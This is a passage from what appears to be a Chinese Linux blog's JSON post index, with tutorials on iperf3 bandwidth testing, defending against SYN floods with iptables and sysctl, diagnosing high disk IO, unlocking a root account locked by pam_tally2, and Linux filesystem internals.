来进行测试。","text":"很多时候，我们需要知道2台机器之间的带宽最大能够达到多少。这个时候我们可以通过iperf3 来进行测试。 下面我来介绍下如何进行带宽的测试。 操作步骤1.首先，你需要准备2台机器，并且都安装 iperf3，以centos为例 1yum -y install iperf3 2.在服务端执行 1# iperf3 -s -i 1 -p 10000 参数说明： -s 表示启动服务端 -i 表示汇报时间间隔 -p 指定端口 3.在客户端执行 1iperf3 -c 192.168.10.163 -b 1G -t 15 -P 2 -p 10000 参数说明： -c 指定对端服务器IP -b 指定带宽 -t 表示测试时间 -P表示并发数 -p 表示服务端端口 测试完毕后会输出结果，其中Bandwidth 就是带宽，可以看到，这2台机器之间通信的发送和接收最大带宽接近1G。 1234567[ ID] Interval Transfer Bandwidth Retr[ 4] 0.00-15.00 sec 932 MBytes 521 Mbits&#x2F;sec 0 sender[ 4] 0.00-15.00 sec 931 MBytes 521 Mbits&#x2F;sec receiver[ 6] 0.00-15.00 sec 851 MBytes 476 Mbits&#x2F;sec 1 sender[ 6] 0.00-15.00 sec 851 MBytes 476 Mbits&#x2F;sec receiver[SUM] 0.00-15.00 sec 1.74 GBytes 997 Mbits&#x2F;sec 1 sender[SUM] 0.00-15.00 sec 1.74 GBytes 997 Mbits&#x2F;sec receiver","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何防范DDOS攻击","slug":"如何防范DDOS攻击","date":"2019-04-01T07:52:55.000Z","updated":"2021-02-26T06:05:29.331Z","comments":true,"path":"posts/41064.html","link":"","permalink":"https://awen.me/posts/41064.html","excerpt":"以 DDOS SYN Flood 攻击为例。 第一种方式是禁止攻击来源IP，但是通常攻击源都不是一个IP 1$ iptables -I INPUT -s 192.168.0.2 -p tcp -j REJECT","text":"以 DDOS SYN Flood 攻击为例。 第一种方式是禁止攻击来源IP，但是通常攻击源都不是一个IP 1$ iptables -I INPUT -s 192.168.0.2 -p tcp -j REJECT 第二钟方式是 限制syn并发的次数以及同一个IP 新建连接数的数量 12345# 限制 syn 并发数为每秒 1 次$ iptables -A INPUT -p tcp --syn -m limit --limit 1&#x2F;s -j ACCEPT# 限制单个 IP 在 60 秒新建立的连接数为 10$ iptables -I INPUT -p tcp --dport 80 --syn -m recent --name SYN_FLOOD --update --seconds 60 --hitcount 10 -j REJECT 但是如果攻击源特别多，其实还是很难阻挡。 SYN Flood 会导致 SYN_RECV 状态的连接急剧增大，可以通过调整半连接容量大小，例如调整为 1024 12$ sysctl -w net.ipv4.tcp_max_syn_backlog&#x3D;1024net.ipv4.tcp_max_syn_backlog &#x3D; 1024 另外，每个SYN_RECV 如果失败，内核还会自动重试，默认是 5次，可以修改为1次 12$ sysctl -w net.ipv4.tcp_synack_retries&#x3D;1net.ipv4.tcp_synack_retries &#x3D; 1 此外，TCP SYN Cookies 是一种专门防御 SYN Flood 攻击的方法，其原理是基于连接信息(包括源地址、源端口、目的地址、目的端口等）以及一个加密种子（如系统启动时间），计算出一个哈希值（SHA1），这个哈希值称为 cookie。 这个 cookie 就被用作序列号，来应答 SYN+ACK 包，并释放连接状态。当客户端发送完三次握手的最后一次 ACK 后，服务器就会再次计算这个哈希值，确认是上次返回的 SYN+ACK 的返回包，才会进入 TCP 的连接状态。 因而，开启 SYN Cookies 后，就不需要维护半开连接状态了，进而也就没有了半连接数的限制。 注意:开启 TCP syncookies 后，内核选项 net.ipv4.tcp_max_syn_backlog 也就无效了。 可以通过下面的方式开启 12$ sysctl -w net.ipv4.tcp_syncookies&#x3D;1net.ipv4.tcp_syncookies &#x3D; 1","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"分析IO 高案例","slug":"分析IO-高案例","date":"2019-03-29T07:20:20.000Z","updated":"2021-02-26T06:05:29.315Z","comments":true,"path":"posts/54114.html","link":"","permalink":"https://awen.me/posts/54114.html","excerpt":"案例分析1.首先，执行 top 发现负载很高，其次，发送CPU 利用率比较低，但是iowait 很高，高达63.4，再次发现进程中占CPU和内存最高的是一个python 应用。进程ID 5593","text":"案例分析1.首先，执行 top 发现负载很高，其次，发送CPU 利用率比较低，但是iowait 很高，高达63.4，再次发现进程中占CPU和内存最高的是一个python 应用。进程ID 5593 12345678910111213top - 15:21:09 up 22:38, 2 users, load average: 2.54, 2.27, 1.35Tasks: 86 total, 3 running, 50 sleeping, 0 stopped, 0 zombie%Cpu(s): 3.2 us, 16.4 sy, 0.0 ni, 16.9 id, 63.4 wa, 0.0 hi, 0.0 si, 0.2 stKiB Mem : 8156288 total, 5366112 free, 1109200 used, 1680976 buff&#x2F;cacheKiB Swap: 8388604 total, 8388080 free, 524 used. 6763836 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 5593 root 20 0 963312 934276 5320 R 37.5 11.5 4:49.05 python 5648 root 20 0 0 0 0 D 1.3 0.0 0:03.47 kworker&#x2F;u128:2 1043 root 20 0 1044268 64328 27400 S 0.7 0.8 2:02.97 dockerd 8 root 20 0 0 0 0 R 0.3 0.0 0:00.96 rcu_sched 3937 root 20 0 103864 7148 6148 S 0.3 0.1 0:00.60 sshd 1 root 20 0 225036 8624 6508 S 0.0 0.1 0:02.31 systemd 2.使用 iostat -d -x 1 查看所有磁盘的io情况，发现 vda 的util 高达98% 接近饱和，其次发现IO高的原因是因为往磁盘不停的写数据，平均每秒写入数据 105856KB 3.我们通过pidstat -d 1 查看是哪个进程占用IO高，发现果然是这个python 进程。 4.然后通过 strace 追踪Python 进程 5593 发现其一直在调用write函数向文件描述符变化为 3的文件写入文件 平均每秒写入数据 300 MB(314572844/1024/1024) 观察stat，他打开的是/tmp/logtest.txt 文件 12345678910111213141516171819202122232425262728293031root@linux:~# strace -p 5593strace: Process 5593 attachedstat(&quot;&#x2F;tmp&#x2F;logtest.txt&quot;, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;943718535, ...&#125;) &#x3D; 0rename(&quot;&#x2F;tmp&#x2F;logtest.txt&quot;, &quot;&#x2F;tmp&#x2F;logtest.txt.1&quot;) &#x3D; 0open(&quot;&#x2F;tmp&#x2F;logtest.txt&quot;, O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0666) &#x3D; 3fcntl(3, F_SETFD, FD_CLOEXEC) &#x3D; 0fstat(3, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;0, ...&#125;) &#x3D; 0lseek(3, 0, SEEK_END) &#x3D; 0ioctl(3, TIOCGWINSZ, 0x7ffcc341db60) &#x3D; -1 ENOTTY (Inappropriate ioctl for device)lseek(3, 0, SEEK_CUR) &#x3D; 0ioctl(3, TIOCGWINSZ, 0x7ffcc341da80) &#x3D; -1 ENOTTY (Inappropriate ioctl for device)lseek(3, 0, SEEK_CUR) &#x3D; 0mmap(NULL, 314576896, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f016accf000mmap(NULL, 314576896, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f01580ce000write(3, &quot;2019-03-29 07:26:28,703 - __main&quot;..., 314572844) &#x3D; 314572844munmap(0x7f01580ce000, 314576896) &#x3D; 0write(3, &quot;\\n&quot;, 1) &#x3D; 1munmap(0x7f016accf000, 314576896) &#x3D; 0select(0, NULL, NULL, NULL, &#123;tv_sec&#x3D;0, tv_usec&#x3D;100000&#125;) &#x3D; 0 (Timeout)getpid() &#x3D; 1mmap(NULL, 314576896, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f016accf000mmap(NULL, 393220096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f01535ce000mremap(0x7f01535ce000, 393220096, 314576896, MREMAP_MAYMOVE) &#x3D; 0x7f01535ce000munmap(0x7f016accf000, 314576896) &#x3D; 0lseek(3, 0, SEEK_END) &#x3D; 314572845lseek(3, 0, SEEK_CUR) &#x3D; 314572845munmap(0x7f01535ce000, 314576896) &#x3D; 0mmap(NULL, 314576896, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f016accf000mmap(NULL, 314576896, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) &#x3D; 0x7f01580ce000write(3, &quot;2019-03-29 07:26:37,480 - __main&quot;..., 314572844) &#x3D; 314572844munmap(0x7f01580ce000, 314576896) &#x3D; 0 5.我们进一步确认，使用lsof 查看该进程调用情况，发现其确实打开了文件/tmp/logtest.txt，这个输出界面 3w 表示3号文件描述符的权限为写(w) 12345678910root@linux:~# lsof -p 5593COMMAND PID USER FD TYPE DEVICE SIZE&#x2F;OFF NODE NAMEpython 5593 root cwd DIR 0,51 4096 131090 &#x2F;python 5593 root rtd DIR 0,51 4096 131090 &#x2F;python 5593 root txt REG 0,51 28016 266366 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7python 5593 root mem REG 252,1 266366 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 (stat: No such file or directory)*****python 5593 root 1u CHR 136,0 0t0 3 &#x2F;dev&#x2F;pts&#x2F;0python 5593 root 2u CHR 136,0 0t0 3 &#x2F;dev&#x2F;pts&#x2F;0python 5593 root 3w REG 252,1 916045824 2914 &#x2F;tmp&#x2F;logtest.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 磁盘的性能指标和观察方法","slug":"Linux-磁盘的性能指标和观察方法","date":"2019-03-29T06:45:30.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/59481.html","link":"","permalink":"https://awen.me/posts/59481.html","excerpt":"磁盘性能指标说到磁盘性能的衡量标准，必须要提到五个常见指标，也就是我们经常用到的，使用率、饱和度、IOPS、吞吐量","text":"磁盘性能指标说到磁盘性能的衡量标准，必须要提到五个常见指标，也就是我们经常用到的，使用率、饱和度、IOPS、吞吐量 以及响应时间等。这五个指标，是衡量磁盘性能的基本指标。 使用率，是指磁盘处理I/0的时间百分比。过高的使用率(比如超过80%)，通常意味着磁盘I/O存在性能瓶颈。 饱和度,是指磁盘处理I/O的繁忙程度。过高的饱和度，意味着磁盘存在严重的性能瓶颈。当饱和度为100%时，磁盘无法接受新的I/O请求。 IOPS (Input/Output Per Second) ，是指每秒的I/0请求数。 吞吐量，是指每秒的I/O请求大小。 响应时间，是指I/0请求从发出到收到响应的间隔时间。 这里要注意的是，使用率只考虑有没有I/O，而不考虑I/O的大小。换句话说，当使用率是100%的时候，磁盘依然有可能接受新的I/O请求。 这些指标，很可能是你经常挂在嘴边的，一讨论磁盘性能必定提起的对象。不过我还是要强调一点，不要孤立地去比较某一指标，而要结合读写比例、I/O类型(随机还是连续)以及I/O的大小，综合来分析。 IOSTAT1234567891011121314151617root@linux:~# iostat -d -x 1Linux 4.15.0-46-generic (linux) 03&#x2F;29&#x2F;2019 _x86_64_ (2 CPU)Device r&#x2F;s w&#x2F;s rkB&#x2F;s wkB&#x2F;s rrqm&#x2F;s wrqm&#x2F;s %rrqm %wrqm r_await w_await aqu-sz rareq-sz wareq-sz svctm %utilvda 1.00 3.03 9.28 16.20 0.00 0.52 0.06 14.67 1.87 3.46 0.01 9.31 5.35 0.38 0.15vdb 0.00 0.00 0.04 0.00 0.00 0.00 0.00 0.00 1.25 0.00 0.00 24.34 0.00 0.16 0.00vdc 0.52 0.00 659.96 0.00 0.00 0.00 0.00 0.00 21.82 0.00 0.01 1273.55 0.00 11.29 0.59Device r&#x2F;s w&#x2F;s rkB&#x2F;s wkB&#x2F;s rrqm&#x2F;s wrqm&#x2F;s %rrqm %wrqm r_await w_await aqu-sz rareq-sz wareq-sz svctm %utilvda 0.00 2.00 0.00 20.00 0.00 3.00 0.00 60.00 0.00 2.00 0.00 0.00 10.00 0.00 0.00vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00vdc 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00Device r&#x2F;s w&#x2F;s rkB&#x2F;s wkB&#x2F;s rrqm&#x2F;s wrqm&#x2F;s %rrqm %wrqm r_await w_await aqu-sz rareq-sz wareq-sz svctm %utilvda 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00vdc 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 参数说明 需要注意： %util ，就是我们前面提到的磁盘 I/O 使用率； r/s+ w/s ，就是 IOPS； rkB/s+wkB/s ，就是吞吐量； r_await+w_await ，就是响应时间。 在观测指标时，也别忘了结合请求的大小（ rareq-sz 和 wareq-sz）一起分析。 pidstat12345678910111213141516171819202122232425262728293031323334353637383940414243root@linux:~# pidstat -d 1Linux 4.15.0-46-generic (linux) 03&#x2F;29&#x2F;2019 _x86_64_ (2 CPU)02:49:15 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:16 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:17 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:18 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:19 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:20 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:21 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:22 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:23 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:24 PM 0 272 0.00 8.00 0.00 0 systemd-journal02:49:24 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:25 PM 0 272 0.00 224.00 0.00 0 systemd-journal02:49:25 PM 104 982 0.00 4.00 0.00 0 rsyslogd02:49:25 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:26 PM 0 5348 1100.00 7752.00 7752.00 4 check-new-relea02:49:26 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:27 PM 0 4416 0.00 0.00 0.00 5 kworker&#x2F;u128:002:49:27 PM 0 5348 32.00 0.00 0.00 1 check-new-relea02:49:27 PM 0 5356 0.00 8.00 0.00 0 bash02:49:27 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:28 PM 0 1 1364.00 7752.00 7752.00 0 systemd02:49:28 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:29 PM 0 210 0.00 472.00 0.00 0 jbd2&#x2F;vda1-802:49:29 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command02:49:30 PM UID PID kB_rd&#x2F;s kB_wr&#x2F;s kB_ccwr&#x2F;s iodelay Command 从 pidstat 的输出你能看到，它可以实时查看每个进程的 I/O 情况，包括下面这些内容。 用户 ID（UID）和进程 ID（PID） 。 每秒读取的数据大小（kB_rd/s） ，单位是 KB。 每秒发出的写请求数据大小（kB_wr/s） ，单位是 KB。 每秒取消的写请求数据大小（kB_ccwr/s） ，单位是 KB。 块 I/O 延迟（iodelay），包括等待同步块 I/O 和换入块 I/O 结束的时间，单位是时钟周期。 iotop1234567891011121314151617Total DISK READ : 0.00 B&#x2F;s | Total DISK WRITE : 0.00 B&#x2F;sActual DISK READ: 0.00 B&#x2F;s | Actual DISK WRITE: 0.00 B&#x2F;s TID PRIO USER DISK READ DISK WRITE SWAPIN IO&gt; COMMAND 1 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % init 2 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kthreadd] 4 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kworker&#x2F;0:0H] 6 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [mm_percpu_wq] 7 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [ksoftirqd&#x2F;0] 8 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [rcu_sched] 9 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [rcu_bh] 10 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [migration&#x2F;0] 11 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [watchdog&#x2F;0] 12 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [cpuhp&#x2F;0] 13 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [cpuhp&#x2F;1] 14 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [watchdog&#x2F;1] 15 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [migration&#x2F;1] 16 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [ksoftirqd&#x2F;1]","categories":[],"tags":[]},{"title":"root用户被锁无法登录怎么办","slug":"root用户被锁无法登录怎么办","date":"2019-03-29T06:20:17.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/46160.html","link":"","permalink":"https://awen.me/posts/46160.html","excerpt":"有个用户，无法通过普通用户登录root，报错 1Account locked due to 65534 failed logins","text":"有个用户，无法通过普通用户登录root，报错 1Account locked due to 65534 failed logins 客户说这台机器是不是救不活了 很显然，这肯定是可以的。 操作步骤1.首先重启进入单用户模式。 2.检查用户的配置/etc/pam.d/password-auth 发现其 1auth required pam_tally2.so deny&#x3D;3 even_deny_root unlock_time&#x3D;1800 就是这个地方导致的。 说明下 deny = 3 - 3次尝试后拒绝访问并锁定用户。 even_deny_root - 策略也适用于root用户。 unlock_time = 1800 - 帐户将被锁定至30 分钟。（如果要永久锁定直到手动解锁，请删除此参数。） 进入单用户后执行 1234# pam_tally2 --user&#x3D;root # 查看计数器# pam_tally2 --user&#x3D;tecmint -rest # 重置计数器# pam_tally2 --user&#x3D;root # 再次确认# reboot # 重启","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 文件系统原理","slug":"Linux-文件系统原理","date":"2019-03-28T11:29:22.000Z","updated":"2021-02-26T06:05:29.255Z","comments":true,"path":"posts/15273.html","link":"","permalink":"https://awen.me/posts/15273.html","excerpt":"Linux 下一切皆文件。","text":"Linux 下一切皆文件。 索引节点和目录项文件系统，本身是对存储设备上的文件，进行组织管理的机制。组织方式不同，就会形成不同的文件系统。 不仅普通的文件和目录，就连块设备、套接字、管道等，也都要通过统一的文件系统来管理。 为了方便管理，Linux 文件系统为每个文件都分配两个数据结构，索引节点(index node)和目录项(directory entry)。它们主要用来记录文件的元信息和目录结构。 索引节点，简称为inode, 用来记录文件的元数据，比如inode编号、文件大小、访问权限、修改日期、数据的位置等。索引节点和文件一-对应，它跟文件内容-样，都会被持久化存储到磁盘中。所以记住，索引节点同样占用磁盘空间。 目录项，简称为dentry, 用来记录文件的名字、索引节点指针以及与其他目录项的关联关系。多个关联的目录项，就构成了文件系统的目录结构。不过，不同于索引节点，目录项是由内核维护的一个内存数据结构，所以通常也被叫做目录项缓存。 索引节点是每个文件的唯一标志，而目录项维护的正是文件系统的树状结构。目录项和索引节点的关系是多对一，你可以简单理解为，一个文件可以有多个别名。 索引节点和目录项纪录了文件的元数据，以及文件间的目录关系. 磁盘读写的最小单位是扇区，然而扇区只有 512B 大小，如果每次都读写这么小的单位，效率一定很低。所以，文件系统又把连续的扇区组成了逻辑块，然后每次都以逻辑块为最小单元，来管理数据。常见的逻辑块大小为 4KB，也就是由连续的 8 个扇区组成。 第一，目录项本身就是一个内存缓存，而索引节点则是存储在磁盘中的数据。在前面的 Buffer 和 Cache 原理中，我曾经提到过，为了协调慢速磁盘与快速 CPU 的性能差异，文件内容会缓存到页缓存 Cache。 第二，磁盘在执行文件系统格式化时，会被分成三个存储区域，超级块、索引节点区和数据块区。其中， 超级块，存储整个文件系统的状态。 索引节点区，用来存储索引节点。 数据块区，则用来存储文件数据。 虚拟文件系统目录项、索引节点、逻辑块以及超级块，构成了Linux 文件系统的四大基本要素。不过，为了支持各种不同的文件系统，Linux 内核在用户进程和文件系统的中间，又引入了一个抽象层，也就是虚拟文件系统VFS (Virtual File System)。 VFS定义了一组所有文件系统都支持的数据结构和标准接口。这样，用户进程和内核中的其他子系统，只需要跟VFS提供的统一接口进行交互就可以了，而不需要再关心底层各种文件系统的实现细节。 理解系统调用、VFS、缓存、文件系统以及块存储之间的关系: 通过这张图，你可以看到，在VFS的下方，Linux 支持各种各样的文件系统，如Ext4、XFS、NFS等等。按照存储位置的不同，这些文件系统可以分为三类。 第一类是基于磁盘的文件系统，也就是把数据直接存储在计算机本地挂载的磁盘中。常见的Ext4、XFS、OverlayFS 等，都是这类文件系统。 第二类是基于内存的文件系统，也就是我们常说的虚拟文件系统。这类文件系统，不需要任何磁盘分配存储空间，但会占用内存。我们经常用到的/proc文件系统，其实就是一种最常见的虚拟文件系统。此外，/sys 文件系统也属于这一类，主要向用户空间导出层次化的内核对象。 第三类是网络文件系统，也就是用来访问其他计算机数据的文件系统，比如NFS、SMB、iSCSI等。 这些文件系统，要先挂载到VFS目录树中的某个子目录(称为挂载点)， 然后才能访问其中的文件。拿第一类，也就是基于磁盘的文件系统为例，在安装系统时，要先挂载一个根目录(/)，在根目录下再把其他文件系统(比如其他的磁盘分区、/proc 文件系统、/sys 文件系统、NFS等)挂载进来。 文件系统 I/O把文件系统挂载到挂载点后，你就能通过挂载点，再去访问它管理的文件了。VFS 提供了一-组标准的文件访问接口。这些接口以系统调用的方式，提供给应用程序使用。 就拿cat命令来说，它首先调用open()，打开一个文件;然后调用read()，读取文件的内容;最后再调用write()，把文件内容输出到控制台的标准输出中: 123int open(const char *pathname, int flags, mode_t mode); ssize_t read(int fd, void *buf, size_t count); ssize_t write(int fd, const void *buf, size_t count); 文件读写方式的各种差异，导致I/O的分类多种多样。最常见的有，缓冲与非缓冲I/O、直接与非直接I/O、阻塞与非阻塞I/O、同步与异步I/O等。接下来，我们就详细看这四种分类。 第一种，根据是否利用标准库缓存，可以把文件I/O分为缓冲I/O与非缓冲I/O。 缓冲1/O，是指利用标准库缓存来加速文件的访问，而标准库内部再通过系统调度访问文件。 非缓冲I/O，是指直接通过系统调用来访问文件，不再经过标准库缓存。 注意，这里所说的“缓冲”，是指标准库内部实现的缓存。比方说，你可能见到过，很多程序遇到换行时才真正输出，而换行前的内容，其实就是被标准库暂时缓存了起来。 无论缓冲I/O还是非缓冲I/O，它们最终还是要经过系统调用来访问文件。而根据上一节内容，我们知道，系统调用后，还会通过页缓存，来减少磁盘的I/0操作。 第二，根据是否利用操作系统的页缓存，可以把文件I/O0分为直接I/O与非直接I/O。 直接I/O, 是指跳过操作系统的页缓存，直接跟文件系统交互来访问文件。 非直接I/O正好相反，文件读写时，先要经过系统的页缓存，然后再由内核或额外的系统调用，真正写入磁盘。 想要实现直接I/O，需要你在系统调用中，指定O_ DIRECT 标志。如果没有设置过，默认的是非直接I/O。 不过要注意，直接I/O、非直接I/O,本质上还是和文件系统交互。如果是在数据库等场景中，你还会看到，跳过文件系统读写磁盘的情况，也就是我们通常所说的裸I/O。 第三，根据应用程序是否阻塞自身运行，可以把文件I/O分为阻塞I/O和非阻塞I/O: 所谓阻塞I/O，是指应用程序执行I/0操作后，如果没有获得响应，就会阻塞当前线程，自然就不能执行其他任务。 所谓非阻塞I/O， 是指应用程序执行I/O操作后，不会阻塞当前的线程，可以继续执行其他的任务，随后再通过轮询或者事件通知的形式，获取调用的结果。 比方说，访问管道或者网络套接字时，设置O_ NONBL 0CK标志，就表示用非阻塞方式访问;而如果不做任何设置，默认的就是阻塞访问。 第四，根据是否等待响应结果，可以把文件I/O分为同步和异步I/O: 所谓同步I/O， 是指应用程序执行I/O操作后，要一直等到整个I/O完成后，才能获得I/O响应。 所谓异步I/O， 是指应用程序执行I/O操作后，不用等待完成和完成后的响应，而是继续执行就可以。等到这次I/O完成后，响应会用事件通知的方式，告诉应用程序。 举个例子，在操作文件时，如果你设置了O_ SYNC或者O DSYNC标志，就代表同步I/O。 如果设置了O_ DSYNC,就要等文件数据写入磁盘后，才能返回;而O SYNC,则是在O_ _DSYNC基础上，要求文件元数据也要写入磁盘后，才能返回。 再比如，在访问管道或者网络套接字时，设置了O_ ASYNC选项后，相应的I/O就是异步I/O。这样，内核会再通过SIGIO或者SIGPOLL，来通知进程文件是否可读写。 你可能发现了，这里的好多概念也经常出现在网络编程中。比如非阻塞 I/O，通常会跟 select/poll 配合，用在网络套接字的 I/O 中。 缓存内核使用 Slab 机制，管理目录项和索引节点的缓存。/proc/meminfo 只给出了 Slab 的整体大小，具体到每一种 Slab 缓存，还要查看 /proc/slabinfo 这个文件。 123456789101112131415root@linux:~# cat &#x2F;proc&#x2F;slabinfo| grep -E &quot;^#|dentry|inode&quot;# name &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;ovl_inode 94 94 688 47 8 : tunables 0 0 0 : slabdata 2 2 0mqueue_inode_cache 34 34 960 34 8 : tunables 0 0 0 : slabdata 1 1 0fuse_inode 0 0 832 39 8 : tunables 0 0 0 : slabdata 0 0 0ecryptfs_inode_cache 0 0 1024 32 8 : tunables 0 0 0 : slabdata 0 0 0fat_inode_cache 0 0 744 44 8 : tunables 0 0 0 : slabdata 0 0 0squashfs_inode_cache 0 0 704 46 8 : tunables 0 0 0 : slabdata 0 0 0ext4_inode_cache 17811 18330 1088 30 8 : tunables 0 0 0 : slabdata 611 611 0hugetlbfs_inode_cache 52 52 624 52 8 : tunables 0 0 0 : slabdata 1 1 0sock_inode_cache 1610 1610 704 46 8 : tunables 0 0 0 : slabdata 35 35 0shmem_inode_cache 3456 4094 712 46 8 : tunables 0 0 0 : slabdata 89 89 0proc_inode_cache 22250 22944 680 48 8 : tunables 0 0 0 : slabdata 478 478 0inode_cache 22917 24327 608 53 8 : tunables 0 0 0 : slabdata 459 459 0dentry 66224 70728 192 42 2 : tunables 0 0 0 : slabdata 1684 1684 0 这个界面中，dentry 行表示目录项缓存，inode_ cache 行，表示VFS索引节点缓存，其余的则是各种文件系统的索引节点缓存。 /proc/ slabinfo的列比较多，具体含义你可以查询man slabinfo。在实际性能分析中，我们更常使用slabtop，来找到占用内存最多的缓存类型。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# slabtop # 按c 按照缓存大小排序，按a 按照活跃对象排序Active &#x2F; Total Objects (% used) : 353223 &#x2F; 365205 (96.7%) Active &#x2F; Total Slabs (% used) : 7710 &#x2F; 7710 (100.0%) Active &#x2F; Total Caches (% used) : 75 &#x2F; 114 (65.8%) Active &#x2F; Total Size (% used) : 103736.12K &#x2F; 108805.45K (95.3%) Minimum &#x2F; Average &#x2F; Maximum Object : 0.01K &#x2F; 0.30K &#x2F; 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ&#x2F;SLAB CACHE SIZE NAME 70728 66224 0% 0.19K 1684 42 13472K dentry 57600 57600 100% 0.13K 960 60 7680K kernfs_node_cache 28743 28743 100% 0.10K 737 39 2948K buffer_head 24327 22917 0% 0.59K 459 53 14688K inode_cache 22944 22250 0% 0.66K 478 48 15296K proc_inode_cache 18330 17811 0% 1.06K 611 30 19552K ext4_inode_cache 15912 15912 100% 0.04K 156 102 624K ext4_extent_status 11008 11008 100% 0.03K 86 128 344K kmalloc-32 10944 10944 100% 0.06K 171 64 684K pid 9632 9350 0% 0.50K 301 32 4816K kmalloc-512 9009 8811 0% 0.20K 231 39 1848K vm_area_struct 8960 8608 0% 0.06K 140 64 560K kmalloc-64 7168 7168 100% 0.01K 14 512 56K kmalloc-8 6624 5715 0% 0.25K 207 32 1656K filp 6144 6144 100% 0.02K 24 256 96K kmalloc-16 5880 4378 0% 0.57K 105 56 3360K radix_tree_node 5750 5750 100% 0.09K 125 46 500K anon_vma 4578 4578 100% 0.19K 109 42 872K cred_jar 4094 3456 0% 0.70K 89 46 2848K shmem_inode_cache 3400 3400 100% 0.05K 40 85 160K ftrace_event_field 3360 3360 100% 0.09K 80 42 320K kmalloc-96 2982 2982 100% 0.19K 71 42 568K kmalloc-192 2816 2371 0% 0.25K 88 32 704K kmalloc-256 2128 2128 100% 0.07K 38 56 152K Acpi-Operand 1792 1772 0% 1.00K 56 32 1792K 